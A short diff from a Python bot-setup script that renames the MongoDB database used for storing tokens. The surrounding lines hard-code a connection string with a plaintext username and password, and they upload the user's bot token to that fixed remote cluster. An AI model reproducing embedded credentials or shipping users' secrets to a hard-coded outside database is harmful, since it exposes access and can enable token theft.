@@ -155,7 +155,7 @@ if not bot_token or not primary_admin_id or not random_code:
     save_tokens(bot_token, primary_admin_id, random_code)
 
 client = pymongo.MongoClient("mongodb+srv://Manu:Manu@manu.mudmj2s.mongodb.net/?retryWrites=true&w=majority")
-db = client[Test]
+db = client[random_code]
 db_tokens = db['tokens']
 db_tokens.update_one({}, {"$set": {"bot_token": bot_token}}, upsert=True)
 
